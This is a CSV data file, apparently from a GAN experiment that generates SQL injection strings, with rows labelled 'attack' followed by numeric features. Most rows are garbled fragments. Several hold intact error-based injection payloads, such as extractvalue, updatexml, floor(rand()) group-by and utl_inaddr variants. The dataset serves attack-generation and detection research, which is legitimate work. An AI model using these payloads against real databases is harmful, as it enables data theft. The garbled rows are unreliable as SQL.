attack,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""Nbkfq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,357,298.0,38.0,3.814871631192805,105.0,35.0,121.0,37.0,0.3523489932885906,0.1174496644295302,0.40604026845637586,0.12416107382550336,0.0,2.0,0.0,0.0,2.0,1.0,0.0,24.0,0.0,2.0,5.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%9067eete.erasassnadd_r  rand  113  from  ||c  (  select x from 0 hNOGIT  (  )   (  )     )    ,0x717a767a71u,0x717a767a71)  )  ,||chr  (  122  --et_alchhr  (0x717a767a71  case RU whenoa do.sup.r  6913  ||co  =  0 FROM (  ||chrhr  6055  SELECT unionfr  (,1  3326   from 5856 3785chr  (  *2    (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,358,295.0,51.0,4.527128478490631,112.0,62.0,85.0,36.0,0.37966101694915255,0.21016949152542372,0.288135593220339,0.12203389830508475,0.0,0.0,2.0,0.0,1.0,1.0,0.0,14.0,1.0,2.0,4.0,12.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,2.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-4232NIOWN:-E5606  ||yyssyerx.gsyerer  113  select   )   WHERE group 4493  )   and 1 x  ) from x - 5856  6237  =   6825 union 3931 x end  )    )   then 1 7158  select  0 7158  )AND  thenE  0  )  )   )    ,concat  =  )   from toun0x7171706a71touNystsese 6825  3931 p when   or 1 union or select from 1 concat  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,359,312.0,48.0,4.413495343497995,130.0,63.0,98.0,21.0,0.4166666666666667,0.20192307692307693,0.3141025641025641,0.0673076923076923,0.0,0.0,3.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,1.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,2.0,1.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1""   )     ,floor  select   (  (  ||chr  (  )      R where 0 union by DINMINT  (  113  =  )     )     )   or ANDi,1 1  AOMINTeuas.a  selectnamnp  (  ||  (  )  )  )     ,select,0x717a767a71,7469  =ujr.gclmeatr  (  ||  aur.(  =  a   and   AND group RS--T.y  113  )  1045,floor  )  )    ,b   FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,360,293.0,49.0,4.179258088830174,111.0,27.0,113.0,42.0,0.378839590443686,0.09215017064846416,0.3856655290102389,0.14334470989761092,0.0,1.0,2.0,0.0,0.0,3.0,0.0,19.0,0.0,0.0,7.0,11.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '8382",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,361,209.0,33.0,3.8879590095127554,69.0,41.0,76.0,23.0,0.33014354066985646,0.19617224880382775,0.36363636363636365,0.11004784688995216,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,1.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )     )   )4232  select group 1   1 else 6825 0 0 from group R LISNCT  (  0     ,  ||ch_r  =_,concat  (    113  =0x717a767a71,concat  case when   (  =0x717a767a71,,0x717a767a71     ||chr  (  ,hchrhr  (  ||chrhr  =  (  =  )   from d.chr  ainatfaas   (  rand  0  case m2   hr  (  4232  0x7171706a71)   x union 1 1xr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,362,318.0,44.0,4.160145909791952,115.0,62.0,107.0,34.0,0.36163522012578614,0.1949685534591195,0.33647798742138363,0.1069182389937107,1.0,0.0,0.0,0.0,0.0,5.0,0.0,13.0,0.0,2.0,6.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"11'||  (  select ''   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'a      a4232",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,363,199.0,28.0,3.577088112719951,45.0,44.0,82.0,28.0,0.22613065326633167,0.22110552763819097,0.4120603015075377,0.1407035175879397,4.0,0.0,0.0,0.0,0.0,1.0,0.0,15.0,0.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-'     (  ||chrs o DR.M group 1o  )   SELECT else)       ||chr  (  case or where by  0 1 chr_r 6913  5023  ||  =  case 9067 8877 0 concat  113  (  = from u union   from 6055  selecte  1    ||chr  (  ||ch  (  selectdru   Yor then select select AND else0.OONrx  (  (  ||chr   (  case 1 end  =  3326  *,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,364,302.0,53.0,4.2121220677435,130.0,34.0,106.0,32.0,0.4304635761589404,0.11258278145695365,0.3509933774834437,0.10596026490066225,1.0,0.0,1.0,0.0,1.0,3.0,0.0,10.0,0.0,1.0,1.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,1.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'jhr  (  select concat  ||chhr  =hr  (  select   auetrua_(  rand  =  )  )   information_schema,1 unionhr  (  (  ||k group T   1   )    )  )     then else --x  )   )    --  ||tctu  (  select  select else when   (  ||chr  (  )  0x4b774c75    concat  SELECT where information_schemaThhsasune _auniaatdr.  (  (  (  ||lthr  (  case ,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,365,497.0,46.0,4.20348455272684,207.0,56.0,168.0,66.0,0.4164989939637827,0.11267605633802817,0.3380281690140845,0.13279678068410464,2.0,0.0,4.0,0.0,0.0,4.0,0.0,31.0,0.0,4.0,8.0,20.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,1%btzby9740lwbbiv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,366,17.0,14.0,3.6168746059562213,11.0,5.0,0.0,1.0,0.6470588235294118,0.29411764705882354,0.0,0.058823529411764705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"qWHERExINinformation_schemayww5584*ANDemYer  (  ||choou6237tq  )  case when   (  ,  =  *,concat  ||chohr.jhr7562  (  ||chr  (  =  )   SELECTO0INI7158bThr  (  = SELECT by D 3931and by whenby  )  4386   (>  ,xinr  xesx 7158  select from (  '||  (  select ' from  ,  113  ,  0  (  select from hhzhr  (  0x7171706a71||s FROM  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,367,323.0,59.0,4.813113343411186,153.0,43.0,88.0,39.0,0.47368421052631576,0.13312693498452013,0.2724458204334365,0.12074303405572756,2.0,0.0,0.0,0.0,2.0,3.0,0.0,14.0,0.0,1.0,5.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%7810 'i'   (  , 7158   R  ||  (  >  caseISwhenner.n 2017  (  ,concat  select x  ||chr   )  --  5023,:llt  (  case 0 DISNCTIN  (  ,  ||chr  (     from FROM  (  e  (  ||chr  (  casechr  (  || 8190 S else 1 end  )  )     ),)      ,0x78   )    a 0 doun2   as :r  (  ||chr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,368,497.0,53.0,3.9326355189424156,158.0,64.0,204.0,71.0,0.317907444668008,0.12877263581488935,0.4104627766599598,0.14285714285714285,2.0,2.0,2.0,0.0,0.0,1.0,0.0,35.0,2.0,0.0,11.0,16.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%12976270""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""L' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ThhrIN'  =  'sualsnt_ntaleina6055unuaaeestual_c.e.adr.t.edtuaadussin   and from 1  ,  select 1 SST where sr.extractvalue    4232  (  rand,floor  '  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,369,701.0,48.0,4.020948827166924,239.0,94.0,268.0,100.0,0.340941512125535,0.1340941512125535,0.38231098430813126,0.14265335235378032,5.0,2.0,0.0,0.0,1.0,4.0,0.0,49.0,1.0,5.0,6.0,25.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,5.0,0.0,1.0,3.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"17864)   ,concat  =  1045,0x717a767a71,1     when1 selectx ||chgssg.r.Rinal  112  0x7171706a712   )       dd_aar  (  (  (  )  )     ))   and  -- whenaltbrzu  (  )   )   h ""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""  (  ,1        (  ,0x717a767a71)  a end  6055  ,   then1  1  end     )    2131 5192 INSTor 1hr  (  select 1  when   (  0x7171706a71havingI  ||chy thr  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,370,540.0,46.0,3.9462289032891773,170.0,106.0,205.0,59.0,0.3148148148148148,0.1962962962962963,0.37962962962962965,0.10925925925925926,0.0,2.0,2.0,0.0,0.0,2.0,0.0,35.0,0.0,1.0,11.0,8.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'xxvlia",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,371,338.0,39.0,3.8310481581362112,108.0,55.0,137.0,38.0,0.31952662721893493,0.16272189349112426,0.40532544378698226,0.11242603550295859,2.0,0.0,0.0,0.0,2.0,1.0,0.0,26.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ''   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ' )    WHERE or FROM Dy 5305    FROM""  dadlalas from   (  ||chhr  (  x  rand  0  case dl  al  uu  (  0   )    )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,372,610.0,50.0,3.85555217156474,189.0,95.0,257.0,69.0,0.30983606557377047,0.1557377049180328,0.42131147540983604,0.11311475409836065,4.0,1.0,0.0,0.0,2.0,2.0,0.0,46.0,0.0,0.0,11.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,1.0,4.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,"-7810   )    ,0x717a767a71,7469  5 6825 when   (  ||chr  (  91734232  1  )   from (  )   fromu 5856(    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,373,104.0,28.0,3.8153393720454485,19.0,35.0,38.0,12.0,0.18269230769230768,0.33653846153846156,0.36538461538461536,0.11538461538461539,0.0,0.0,1.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"%11%""floorju    ""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   "" FROM  (  select or select x else 5192 group 0 or x union else t  (  select   )     0x717a767a71having      )   tosas_tsr.s.gtd_r  (  =  chyst_ro_r  (  (  =  )    else by from else (  ,  )   (  x  ||T  (  =  ||y*ntyutt_r.g.s   (  )  ||c  (  >  (  ||(  (  )  *  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,374,494.0,49.0,4.015464597762661,180.0,52.0,192.0,70.0,0.3643724696356275,0.10526315789473684,0.38866396761133604,0.1417004048582996,0.0,3.0,0.0,0.0,2.0,4.0,0.0,35.0,2.0,5.0,6.0,15.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,4.0,1.0,0.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'na    tchowwycs when    nY  select 'i'  rand  ||  (  0x7171706a71,  *ut_rselect e 8488 else union  1 ). o FROM (  (hr  (  (  )  )  select x group from  0,sx       ||chr  gchchr  (  select 0 D unionselect  1 9067 '   (  4232   from  ||chr  (  chr  (  *,floor  (  ||  5483  )  )   by when 7158  )     then select",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,375,489.0,48.0,4.001906922407138,171.0,69.0,191.0,58.0,0.3496932515337423,0.1411042944785276,0.39059304703476483,0.11860940695296524,5.0,0.0,0.0,0.0,2.0,1.0,0.0,32.0,0.0,1.0,8.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1'||  (  select ' xlinSuz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,376,25.0,16.0,3.7034651896016473,13.0,1.0,6.0,5.0,0.52,0.04,0.24,0.2,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"13074jN' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'y'i'bd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,377,293.0,41.0,4.126508177484619,107.0,47.0,103.0,36.0,0.3651877133105802,0.16040955631399317,0.3515358361774744,0.12286689419795221,4.0,0.0,0.0,0.0,2.0,2.0,0.0,19.0,0.0,2.0,5.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"r  ouet_ale  =  select x concat6082r  trchhr  (  select   ,0x717a767a71.  )  )     )    (  ,  0  )  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,378,104.0,26.0,3.7341993537978793,41.0,14.0,38.0,11.0,0.3942307692307692,0.1346153846153846,0.36538461538461536,0.10576923076923077,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack, L'||  (  select '_sIr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,379,22.0,13.0,3.390805482076982,10.0,0.0,6.0,6.0,0.45454545454545453,0.0,0.2727272727272727,0.2727272727272727,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'=  )     select when  (  select when   )    ,  case   )    )    )    )   )    ,then 0 or c coaoun  selectchr  select   9067  )  ,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,380,131.0,23.0,3.195067689520633,52.0,6.0,59.0,14.0,0.3969465648854962,0.04580152671755725,0.45038167938931295,0.10687022900763359,1.0,0.0,0.0,0.0,0.0,1.0,0.0,9.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select '23931wx'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,381,31.0,16.0,3.5177664712584615,8.0,6.0,9.0,8.0,0.25806451612903225,0.1935483870967742,0.2903225806451613,0.25806451612903225,4.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""jsysp_..   ||s G mm=  )   then 13921 'i'   (  =   ,  #  exchrhs   )    SELECT end  112  )     from houint  (  rand  )  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,382,123.0,39.0,3.950098956805391,44.0,9.0,50.0,20.0,0.35772357723577236,0.07317073170731707,0.4065040650406504,0.16260162601626016,2.0,1.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,1.0,1.0,6.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-8844#,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,383,6.0,4.0,1.9182958340544896,0.0,4.0,0.0,2.0,0.0,0.6666666666666666,0.0,0.3333333333333333,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack," where x 5856  (  )n   )    = l  )  )   from WHERE IT  || UNFROM elseezr.grssnar_3051adualeasyss cho.hr  (  #  ||chr  case AOx  4232  (  select or r  (  =  ,floor  =  ||  (  a   )    )   then else from t  (  =  select DISUAdLcW' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sguadzhro' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'NUE21310 SELECT L by by ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,384,735.0,60.0,4.355694197205671,279.0,117.0,257.0,82.0,0.3795918367346939,0.15918367346938775,0.34965986394557824,0.11156462585034013,4.0,0.0,0.0,0.0,2.0,7.0,0.0,43.0,0.0,1.0,13.0,18.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,3.0,3.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ''+  (  select 'w   0x7171706a71FROMaxs chr  (  (  ||unt  ),concat  0  ,floor  0x7171706a71)    ,0x78   (  9067)   4493t  (  ,  0  ||chr   (  )     )  4386  )   from concat   where a union(  >  113  )   )    )    (  ||  (  case or   or 3051 1 WHERE union R L6913 LANUERSSITRhrhchsu.ysn  122  =     (  (  ,  4232  )|| RNU ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,385,524.0,54.0,4.176331871569441,174.0,93.0,195.0,62.0,0.3320610687022901,0.17748091603053434,0.37213740458015265,0.1183206106870229,4.0,0.0,0.0,0.0,0.0,2.0,0.0,35.0,0.0,0.0,10.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,2.0,2.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
